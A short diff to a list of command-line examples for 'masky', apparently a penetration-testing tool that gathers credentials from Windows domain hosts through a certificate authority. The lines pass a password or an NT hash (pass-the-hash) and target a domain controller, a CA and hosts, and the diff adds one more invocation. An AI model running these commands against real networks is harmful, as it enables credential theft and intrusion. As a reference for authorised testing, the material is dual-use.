@@ -2,3 +2,4 @@
 masky -d $DOMAIN -u $USER -p $PASSWORD -dc-ip $DC_IP -ca $CA_NAME $TARGET_IP
 masky -d $DOMAIN -u $USER -H $NTHASH -dc-ip $DC_IP -ca $CA_NAME $TARGET_IP
 masky -d $DOMAIN -u $USER -p $PASSWORD -dc-ip $DC_IP -ca $CA_NAME -o output/ $TARGET_IP
+masky -d $DOMAIN -u $USER -dc-ip $DC_HOST -t 5 -o results.txt -ca "srv-01\srv-01-CA"
